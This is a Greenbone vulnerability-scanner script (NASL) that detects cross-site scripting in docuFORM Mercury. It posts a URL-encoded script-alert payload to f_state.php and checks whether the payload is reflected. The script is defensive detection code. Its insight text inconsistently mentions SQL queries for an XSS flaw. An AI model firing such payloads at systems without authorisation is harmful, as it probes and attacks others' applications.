# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902414");
  script_version("2025-03-05T05:38:52+0000");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:52 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2011-05-02 12:20:04 +0200 (Mon, 02 May 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("docuFORM Mercury Multiple XSS Vulnerabilities");
  script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5010.php");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/100625/ZSL-2011-5010.txt");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to cause Cross-Site
  Scripting by executing arbitrary codes with in the context of the affected application.");

  script_tag(name:"affected", value:"Mercury Web Application version 6.16a and 5.20");

  script_tag(name:"insight", value:"Input passed to the 'this_url' and 'aa_sfunc' parameters in
  f_state.php, f_list.php, f_job.php and f_header.php, is not properly sanitised before being used in SQL queries.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"docuFORM Mercury is prone to multiple cross-site scripting (XSS) vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port))
  exit(0);

res = http_get_cache(item:"/Mercury/login.php", port:port);

if("<title>Mercury</title>" >< res)
{
  filename = "/Mercury/f_state.php";
  host = http_host_name(port:port);

  authVariables = "aa_afunc=call&aa_sfunc=1%3Cscript%3Ealert%28%27XSS-ATTACK" +
                  "%27%29%3C%2Fscript%3E&aa_cfunc=OnAgentGetDeviceList&aa_sf" +
                  "unc_args%255B%255D=0";
  req = string("POST ", filename, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(authVariables), "\r\n\r\n",
               authVariables);
  res = http_send_recv(port:port, data:req);

  if(res =~ "^HTTP/1\.[01] 200" && "<script>alert('XSS-ATTACK')</script>" >< res){
    report = http_report_vuln_url(port:port, url:filename);
    security_message(port:port, data:report);
  }
}
